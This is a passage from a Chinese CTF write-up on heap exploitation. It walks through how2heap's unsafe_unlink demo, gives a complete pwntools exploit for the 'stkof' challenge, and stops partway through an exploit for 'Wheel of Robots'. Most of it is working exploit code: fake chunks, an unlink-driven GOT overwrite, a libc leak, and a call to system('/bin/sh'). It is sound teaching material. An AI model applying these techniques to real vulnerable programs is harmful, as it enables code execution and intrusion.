class="comment">//fprintf(stderr, "1.Now the x = chunk0_ptr[1]&amp;(~0x7) = 0, we should set the *(chunk0_ptr + 0) = 0, in other words we should do nothing\n");</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "2.Further more we set chunk0_ptr = 0x8 in 64-bits environment, then *(chunk0_ptr + 0x8) == chunk0_ptr[1], it's fine to pass\n");</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "3.Finally we can also set chunk0_ptr[1] = x in 64-bits env, and set *(chunk0_ptr+x)=x,for example chunk_ptr0[1] = 0x20, chunk_ptr0[4] = 0x20\n");</span></span><br><span class="line">	<span class="comment">//chunk0_ptr[1] = sizeof(size_t);</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "In this case we set the 'size' of our fake chunk so that chunk0_ptr + size (%p) == chunk0_ptr-&gt;size (%p)\n", ((char *)chunk0_ptr + chunk0_ptr[1]), &amp;chunk0_ptr[1]);</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "You can find the commitdiff of this check at https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30\n\n");</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n"</span>);</span><br><span class="line">	<span class="keyword">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n"</span>);</span><br><span class="line">	chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n"</span>,(<span class="keyword">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n"</span>);</span><br><span class="line">	chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n"</span>);</span><br><span class="line">	<span class="keyword">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(victim_string,<span class="string">"Hello!~"</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Original value: %s\n"</span>,victim_string);</span><br><span class="line">	chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"New Value: %s\n"</span>,victim_string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段的原理在前面SleepyHolder其实已经用过了，所以就只简单的debug，帮助自己记忆一下</p>
<p>Debug:</p>
<p><img src="/2020/02/02/how2heap-unsafe-unlink-stkof%E3%80%81Wheel-of-Robots/1580548299890.png" alt="1580548299890"></p>
<p>更改 chunk 1 prev_inuse之前所伪造的fake chunk，fake chunk-&gt;fd被设置成&amp;chunk0_ptr-0x18，fake chunk-&gt;bk被设置成&amp;chunk0_ptr-0x10，然后prev_size设置成chunk 0 size-0x10（减去chunk head大小，就是我们malloc传入参数的大小0x80）</p>
<p>之后修改chunk 1的prev_inuse位为0，free chunk 1&amp;trigger <code>unlink(chunk0)</code>，通过unlink的检查、操作之后，所得到的结果是chunk0_ptr=0x602058(fake fd)</p>
<p><img src="/2020/02/02/how2heap-unsafe-unlink-stkof%E3%80%81Wheel-of-Robots/1580560743117.png" alt="1580560743117"></p>
<p>此时chunk0_ptr[3]刚好为chunk0_ptr，填入victim_string的地址，然后对其进行修改</p>
<p>具体步骤回顾前一篇写的unlink过程，不再做多解释</p>
<h1 id="stkof"><a href="#stkof" class="headerlink" title="stkof"></a>stkof</h1><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>程序一共有四个功能供选择，执行成功输出OK，执行失败输出FAIL</p>
<p><img src="/2020/02/02/how2heap-unsafe-unlink-stkof%E3%80%81Wheel-of-Robots/1580559836335.png" alt="1580559836335"></p>
<h3 id="new"><a href="#new" class="headerlink" title="new:"></a>new:</h3><p><img src="/2020/02/02/how2heap-unsafe-unlink-stkof%E3%80%81Wheel-of-Robots/1580559935789.png" alt="1580559935789"></p>
<p>malloc一个没有大小检查的chunk，放入s数组记录，并输出对应index，malloc时对应index只增不减</p>
<h3 id="fill-chunk"><a href="#fill-chunk" class="headerlink" title="fill_chunk:"></a>fill_chunk:</h3><p><img src="/2020/02/02/how2heap-unsafe-unlink-stkof%E3%80%81Wheel-of-Robots/1580560078101.png" alt="1580560078101"></p>
<p>输入index后检查index大小、以及对应index是否有记录chunk，然后输入想要fill的大小，这里对大小没有检查，存在overflow</p>
<h3 id="Free："><a href="#Free：" class="headerlink" title="Free："></a>Free：</h3><p><img src="/2020/02/02/how2heap-unsafe-unlink-stkof%E3%80%81Wheel-of-Robots/1580560247354.png" alt="1580560247354"></p>
<p>输入index，检查index大小、以及对应index是否 有记录，然后free 对应的chunk，并清除记录</p>
<h3 id="todo"><a href="#todo" class="headerlink" title="todo:"></a>todo:</h3><p><img src="/2020/02/02/how2heap-unsafe-unlink-stkof%E3%80%81Wheel-of-Robots/1580560405002.png" alt="1580560405002"></p>
<p>似乎没什么用…（但是在后面的利用用到了）</p>
<h2 id="Exploit："><a href="#Exploit：" class="headerlink" title="Exploit："></a>Exploit：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">new(<span class="number">0x80</span>)<span class="comment">#index 1</span></span><br><span class="line">new(<span class="number">0x80</span>)<span class="comment">#index 2 </span></span><br><span class="line">new(<span class="number">0x80</span>)<span class="comment">#index 3</span></span><br><span class="line">new(<span class="number">0x80</span>)<span class="comment">#index 4</span></span><br><span class="line">new(<span class="number">0x80</span>)<span class="comment">#index 5 unlink chunk</span></span><br><span class="line">new(<span class="number">0x80</span>)<span class="comment">#index 6 chunk to free</span></span><br><span class="line">new(<span class="number">0x80</span>)<span class="comment">#index 7 Avoid merging</span></span><br></pre></td></tr></table></figure>

<p>首先new出7个small chunk，此时记录如图所示</p>
<p><img src="/2020/02/02/how2heap-unsafe-unlink-stkof%E3%80%81Wheel-of-Robots/1580563261399.png" alt="1580563261399"></p>
<p>利用fill_chunk和chunk 5修改chunk 6 的prev_inuse位，顺带构造一个fake chunk</p>
<p><em>（这里为什么不从chunk1开始主要是因为在调试时发现chunk 1的前后分别有一个size为1040的chunk，具体原因参考ctf-wiki  <a href="https://wiki.x10sec.org/pwn/heap/unlink/#2014-hitcon-stkof）" target="_blank" rel="noopener">https://wiki.x10sec.org/pwn/heap/unlink/#2014-hitcon-stkof）</a></em></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">chunk5_address=<span class="number">0x602168</span></span><br><span class="line">fake_chunk  = p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)<span class="comment">#fake chunk head</span></span><br><span class="line">fake_chunk += p64(chunk5_address<span class="number">-0x18</span>)+p64(chunk5_address<span class="number">-0x10</span>)<span class="comment">#fake fd/bk</span></span><br><span class="line">fake_chunk += <span class="string">'\x00'</span>*(<span class="number">0x80</span>-len(fake_chunk))</span><br><span class="line">fake_chunk += p64(<span class="number">0x80</span>)+<span class="string">'\x90'</span><span class="comment">#fake prev_size,prev_inuse</span></span><br><span class="line">fill_chunk(<span class="number">5</span>,len(fake_chunk),fake_chunk)</span><br></pre></td></tr></table></figure>

<p>fill之后：</p>
<p><img src="/2020/02/02/how2heap-unsafe-unlink-stkof%E3%80%81Wheel-of-Robots/1580563976215.png" alt="1580563976215"></p>
<p>之后free chunk 6，第5个chunk用来unlink，这个操作设置其内容为&amp;chunk2</p>
<p>执行free之后（这个截图是还没执行到s[6]=0处）：</p>
<p><img src="/2020/02/02/how2heap-unsafe-unlink-stkof%E3%80%81Wheel-of-Robots/1580564233828.png" alt="1580564233828"></p>
<p>接着利用其修改index 2处的记录为&amp;strlen_GOT，然后使用fill_chunk(2)修改strlen_GOT的值为&amp;puts_plt</p>
<p>修改index 2处的记录为&amp;puts_GOT</p>
<p>接着调用todo，输入2即可puts(&amp;strlen_GOT)，接着根据strlen在libc的偏移计算出libc base</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">strlen_GOT=<span class="number">0x602030</span></span><br><span class="line">puts_GOT=<span class="number">0x602020</span></span><br><span class="line">puts_plt=<span class="number">0x400760</span></span><br><span class="line">fill_chunk(<span class="number">5</span>,<span class="number">8</span>,p64(strlen_GOT)) <span class="comment">#index 2-&gt;strlen_GOT address</span></span><br><span class="line">fill_chunk(<span class="number">2</span>,<span class="number">8</span>,p64(puts_plt))<span class="comment">#set strlen_GOT -&gt; puts_plt </span></span><br><span class="line">fill_chunk(<span class="number">5</span>,<span class="number">8</span>,p64(puts_GOT))<span class="comment">#index 2-&gt;puts_GOT address</span></span><br><span class="line">todo(<span class="number">2</span>)<span class="comment">#puts(&amp;puts_GOT)</span></span><br><span class="line">libc_base=my_u64(p.recv(<span class="number">6</span>))<span class="number">-0x6f690</span></span><br></pre></td></tr></table></figure>

<p>同样利用上面的方式，fill chunk 3为/bin/sh，然后将strlen_GOT设置成system的地址，todo(3)即可getshell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">system_offset=<span class="number">0x45390</span></span><br><span class="line">fill_chunk(<span class="number">5</span>,<span class="number">8</span>,p64(strlen_GOT))<span class="comment">#index 2-&gt;strlen_GOT address</span></span><br><span class="line">fill_chunk(<span class="number">2</span>,<span class="number">8</span>,p64(libc_base+system_offset))<span class="comment">#set strlen_GOT -&gt; system</span></span><br><span class="line">fill_chunk(<span class="number">3</span>,len(<span class="string">'/bin/sh'</span>),<span class="string">'/bin/sh'</span>)</span><br><span class="line">todo(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<h2 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./stkof'</span>	<span class="comment">#binary's name here</span></span><br><span class="line">context.binary = binary		<span class="comment">#context here</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">pty = process.PTY</span><br><span class="line">p = process(binary, aslr = <span class="number">1</span>, stdin=pty, stdout=pty)	<span class="comment">#process option here</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Host =</span></span><br><span class="line"><span class="string">Port =</span></span><br><span class="line"><span class="string">p = remote(Host,Port)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">my_u64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">ub_offset = <span class="number">0x3c4b30</span></span><br><span class="line">codebase = <span class="number">0x555555554000</span></span><br><span class="line"><span class="comment">#log.info("\033[1;36m" + hex(bin_addr) + "\033[0m")</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># todo here</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size)</span>:</span></span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill_chunk</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Free</span><span class="params">(index)</span>:</span></span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">todo</span><span class="params">(index)</span>:</span></span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.sendline(<span class="string">'4'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x80</span>)<span class="comment">#index 1 can't use</span></span><br><span class="line">p.recvuntil(<span class="string">'OK\n'</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x80</span>)<span class="comment">#index 2</span></span><br><span class="line">p.recvuntil(<span class="string">'OK\n'</span>)</span><br><span class="line">new(<span class="number">0x80</span>)<span class="comment">#index 3</span></span><br><span class="line">p.recvuntil(<span class="string">'OK\n'</span>)</span><br><span class="line">new(<span class="number">0x80</span>)<span class="comment">#index 4</span></span><br><span class="line">p.recvuntil(<span class="string">'OK\n'</span>)</span><br><span class="line">new(<span class="number">0x80</span>)<span class="comment">#index 5 unlink chunk</span></span><br><span class="line">p.recvuntil(<span class="string">'OK\n'</span>)</span><br><span class="line">new(<span class="number">0x80</span>)<span class="comment">#index 6 chunk to free</span></span><br><span class="line">p.recvuntil(<span class="string">'OK\n'</span>)</span><br><span class="line">new(<span class="number">0x80</span>)<span class="comment">#index 7 Avoid merging</span></span><br><span class="line">p.recvuntil(<span class="string">'OK\n'</span>)</span><br><span class="line"></span><br><span class="line">chunk5_address=<span class="number">0x602168</span></span><br><span class="line">fake_chunk  = p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)<span class="comment">#fake chunk head</span></span><br><span class="line">fake_chunk += p64(chunk5_address<span class="number">-0x18</span>)+p64(chunk5_address<span class="number">-0x10</span>)<span class="comment">#fake fd/bk</span></span><br><span class="line">fake_chunk += <span class="string">'\x00'</span>*(<span class="number">0x80</span>-len(fake_chunk))</span><br><span class="line">fake_chunk += p64(<span class="number">0x80</span>)+<span class="string">'\x90'</span><span class="comment">#fake prev_size,prev_inuse</span></span><br><span class="line">fill_chunk(<span class="number">5</span>,len(fake_chunk),fake_chunk)</span><br><span class="line">p.recvuntil(<span class="string">'OK\n'</span>)</span><br><span class="line"></span><br><span class="line">Free(<span class="number">6</span>)</span><br><span class="line">p.recvuntil(<span class="string">'OK\n'</span>)</span><br><span class="line">strlen_GOT=<span class="number">0x602030</span></span><br><span class="line">puts_GOT=<span class="number">0x602020</span></span><br><span class="line">puts_plt=<span class="number">0x400760</span></span><br><span class="line">fill_chunk(<span class="number">5</span>,<span class="number">8</span>,p64(strlen_GOT))</span><br><span class="line">p.recvuntil(<span class="string">'OK\n'</span>)</span><br><span class="line">fill_chunk(<span class="number">2</span>,<span class="number">8</span>,p64(puts_plt))</span><br><span class="line">p.recvuntil(<span class="string">'OK\n'</span>)</span><br><span class="line">fill_chunk(<span class="number">5</span>,<span class="number">8</span>,p64(puts_GOT))</span><br><span class="line">p.recvuntil(<span class="string">'OK\n'</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'b *0x400C1C'</span>)</span><br><span class="line"></span><br><span class="line">todo(<span class="number">2</span>)</span><br><span class="line">libc_base=my_u64(p.recv(<span class="number">6</span>))<span class="number">-0x6f690</span></span><br><span class="line">log.info(<span class="string">"\033[1;36m"</span> + <span class="string">'libc_base:'</span>+hex(libc_base) + <span class="string">"\033[0m"</span>)</span><br><span class="line"></span><br><span class="line">system_offset=<span class="number">0x45390</span></span><br><span class="line">fill_chunk(<span class="number">5</span>,<span class="number">8</span>,p64(strlen_GOT))</span><br><span class="line">p.recvuntil(<span class="string">'OK\n'</span>)</span><br><span class="line">fill_chunk(<span class="number">2</span>,<span class="number">8</span>,p64(libc_base+system_offset))</span><br><span class="line">p.recvuntil(<span class="string">'OK\n'</span>)</span><br><span class="line">fill_chunk(<span class="number">3</span>,len(<span class="string">'/bin/sh'</span>),<span class="string">'/bin/sh'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'OK\n'</span>)</span><br><span class="line">todo(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><em>ps:ctf-wiki上面是直接修改 <code>atoi@got</code> 为 system 函数地址，再次调用时，输入 /bin/sh 地址，这里可以用作以后exploit的参考</em></p>
<h1 id="Wheel-of-Robots"><a href="#Wheel-of-Robots" class="headerlink" title="Wheel of Robots"></a>Wheel of Robots</h1><h2 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h2><p>主菜单一共有四个选择，在进行选择之前用/dev/random读取随机数来当做srand种子</p>
<p><img src="/2020/02/02/how2heap-unsafe-unlink-stkof%E3%80%81Wheel-of-Robots/1580573062290.png" alt="1580573062290"></p>
<h3 id="add："><a href="#add：" class="headerlink" title="add："></a>add：</h3><h4 id="输入选择部分"><a href="#输入选择部分" class="headerlink" title="输入选择部分"></a>输入选择部分</h4><p><img src="/2020/02/02/how2heap-unsafe-unlink-stkof%E3%80%81Wheel-of-Robots/1580573416563.png" alt="1580573416563"></p>
<p>提供一个机器人选择菜单，然后对全局变量choic输入5B，此处存在一个<strong>1 Byte overflow</strong>，可以覆盖到<code>Bender</code>。</p>
<p>numofrobot不能大于2（初始为0）</p>
<h4 id="Tinny-Tim-对应1-："><a href="#Tinny-Tim-对应1-：" class="headerlink" title="Tinny_Tim(对应1)："></a>Tinny_Tim(对应1)：</h4><p><img src="/2020/02/02/how2heap-unsafe-unlink-stkof%E3%80%81Wheel-of-Robots/1580573549034.png" alt="1580573549034"></p>
<p>Tinny Tim是一个0x14大小的fast chunk，用calloc分配。<code>Tinny_Tim</code>记录这个机器人是否存在，<code>Tinny_Tim_ptr</code>记录堆指针，calloc之后将chunk data部分填充为Tinny Tim字符串</p>
<h4 id="Bender-对应2-："><a href="#Bender-对应2-：" class="headerlink" title="Bender(对应2)："></a>Bender(对应2)：</h4><p><img src="/2020/02/02/how2heap-unsafe-unlink-stkof%E3%80%81Wheel-of-Robots/1580573753819.png" alt="1580573753819"></p>
<p>Bender是一个大小不固定的fast chunk ，其大小根据用户输入<code>Bender_intelligence</code>决定，最大为0x3c，calloc分配，<code>Bender</code>记录机器人是否存在，<code>Bender_ptr</code>记录堆指针，calloc之后对chunk data部分填充</p>
<h4 id="Devil-对应3-："><a href="#Devil-对应3-：" class="headerlink" title="Devil(对应3)："></a>Devil(对应3)：</h4><p><img src="/2020/02/02/how2heap-unsafe-unlink-stkof%E3%80%81Wheel-of-Robots/1580574045235.png" alt="1580574045235"></p>
<p>Devil是一个大小不固定的chunk，大小根据用户输入的<code>Devil_cruelty</code>决定，最大为0x7bc，calloc分配，<code>Devil</code>记录机器人是否存在，<code>Devil_ptr</code>记录堆指针，calloc之后对chunk data填充</p>
<h4 id="Chain-smoker-对应4-："><a href="#Chain-smoker-对应4-：" class="headerlink" title="Chain_smoker(对应4)："></a>Chain_smoker(对应4)：</h4><p><img src="/2020/02/02/how2heap-unsafe-unlink-stkof%E3%80%81Wheel-of-Robots/1580574275281.png" alt="1580574275281"></p>
<p>Chain_smoker是一个大小固定的chunk（0xFA0），calloc分配，<code>Chain_smoker</code>记录机器人是否存在，<code>Chain_smoker_ptr</code>记录堆指针，calloc之后对chunk data填充</p>
<h4 id="Billionaire-Bot-对应5-："><a href="#Billionaire-Bot-对应5-：" class="headerlink" title="Billionaire_Bot(对应5)："></a>Billionaire_Bot(对应5)：</h4><p><img src="/2020/02/02/how2heap-unsafe-unlink-stkof%E3%80%81Wheel-of-Robots/1580574445414.png" alt="1580574445414"></p>
<p>Billionaire_Bot是一个固定大小的chunk（0x9C40），calloc分配，<code>Billionaire_Bot</code>记录是否存在，<code>Billionaire_Bot_ptr</code>记录堆指针，calloc之后对chunk data填充</p>
<h4 id="Destructor-对应6-："><a href="#Destructor-对应6-：" class="headerlink" title="Destructor(对应6)："></a>Destructor(对应6)：</h4><p><img src="/2020/02/02/how2heap-unsafe-unlink-stkof%E3%80%81Wheel-of-Robots/1580574577079.png" alt="1580574577079"></p>
<p>Destructor是一个大小不固定的chunk，大小根据用户输入的<code>Destructor_powerful</code>决定，calloc分配，<code>Destructor</code>记录机器人是否存在，<code>Destructor_ptr</code>记录堆指针，calloc之后对chunk data填充</p>
<h4 id="total："><a href="#total：" class="headerlink" title="total："></a><em>total：</em></h4><p>这里再记一下64位不同chunk的size范围（fast chunk：0x20~0x80，small chunk：&lt;0x400，large chunk &gt;=0x400）</p>
<ol>
<li>Tinny Tim：大小固定fast chunk 0x14</li>
<li>Bender：大小不固定fast chunk 0x14~0x3c</li>
<li>Robot Devil：大小不固定chunk，可以是fast chunk，small chunk，large chunk，max：0x7bc</li>
<li>Chain Smoker：large chunk 0xFA0</li>
<li>Billionaire Bot：large chunk 0x9C40</li>
<li>Destructor：可以是fast chunk，small chunk，large chunk</li>
</ol>
<h3 id="delete："><a href="#delete：" class="headerlink" title="delete："></a>delete：</h3><p>输入部分没有add的 overflow（有了add的分析基础接下来的分析简单一点）</p>
<p><img src="/2020/02/02/how2heap-unsafe-unlink-stkof%E3%80%81Wheel-of-Robots/1580575014595.png" alt="1580575014595"></p>
<p>全都是相同的操作，判断各记录，将对应ptr free掉之后把记录清零，然后numofrobot–</p>
<h3 id="change："><a href="#change：" class="headerlink" title="change："></a>change：</h3><p>change 的输入也是正常的</p>
<p><img src="/2020/02/02/how2heap-unsafe-unlink-stkof%E3%80%81Wheel-of-Robots/1580575136615.png" alt="1580575136615"></p>
<p>同样都是一个操作，检查记录，将对应chunk的data段renew，输入大小为申请时的大小</p>
<h3 id="startwheel："><a href="#startwheel：" class="headerlink" title="startwheel："></a>startwheel：</h3><p>当有2个robot时，产生0~6的随机数，随机选择输出一个chunk的内容</p>
<p><img src="/2020/02/02/how2heap-unsafe-unlink-stkof%E3%80%81Wheel-of-Robots/1580639554736.png" alt="1580639554736"></p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit:"></a>Exploit:</h2><p><em>这个方法是我自己写，没有看ctf-wiki的WP时候摸索出来的方法，并没有用到startwheel函数</em></p>
<p>原ctf-wiki链接：<a href="https://wiki.x10sec.org/pwn/heap/unlink/#2017-insomnihack-wheelofrobots" target="_blank" rel="noopener">https://wiki.x10sec.org/pwn/heap/unlink/#2017-insomnihack-wheelofrobots</a></p>
<p>add一个Bender（fast chunk），add一个Robot Devil（small chunk，这个用来Avoid merging&amp;trigger unlink），然后delete掉Bender，接着malloc一个Chain Smoker（large chunk），trigger <code>malloc_consolidate</code>，将fast chunk放入smallbins，然后通过1 Byte overflow更改<code>Bender</code>为1，再次delete，构成double free。（wiki上面是利用fastbin attack修改记录的chunk大小，change时构成overflow）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释末尾的数字表示numofrobot</span></span><br><span class="line">add(<span class="number">2</span>,intelligence=<span class="number">2</span>)<span class="comment">#Add Bender						1</span></span><br><span class="line">add(<span class="number">3</span>,cruelty=<span class="number">0x20</span>)<span class="comment">#Add Robot Devil	small chunk				2</span></span><br><span class="line">delete(<span class="number">2</span>)<span class="comment">#Add Bender to fastbins						1</span></span><br><span class="line">add(<span class="number">4</span>)<span class="comment">#Add large chunk(Chain_smoker) trigger malloc_consolidate	   		2</span></span><br><span class="line">overflow_Bender_to(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)<span class="comment">#Delete Bender again							1</span></span><br><span class="line"><span class="comment">#double free now</span></span><br></pre></td></tr></table></figure>



<p><em>double free和malloc_consolidate的联合利用在之前SleepyHolder中已经写过了所以这里写简单一些</em></p>
<p>再add一个Bender，change时构造一个fake chunk，然后delete Robot Devil，trigger unlink，结束后<code>Bender_ptr</code>会指向&amp;Bender_ptr-0x18处，如图：</p>
<p><img src="/2020/02/02/how2heap-unsafe-unlink-stkof%E3%80%81Wheel-of-Robots/1580640134364.png" alt="1580640134364"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Bender_ptr=<span class="number">0x6030F0</span></span><br><span class="line">add(<span class="number">2</span>,intelligence=<span class="number">2</span>)<span class="comment">#Add Bender 						2</span></span><br><span class="line">fake_chunk  = p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)<span class="comment">#fake chunk head</span></span><br><span class="line">fake_chunk += p64(Bender_ptr<span class="number">-0x18</span>)+p64(Bender_ptr<span class="number">-0x10</span>)<span class="comment">#fake fd/bk</span></span><br><span class="line">fake_chunk += <span class="string">'\x00'</span>*(<span class="number">0x20</span>-len(fake_chunk))</span><br><span class="line">fake_chunk += p64(<span class="number">0x20</span>)<span class="comment">#fake prev_size</span></span><br><span class="line">change(<span class="number">2</span>,fake_chunk)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)<span class="comment">#set Bender to fastbin							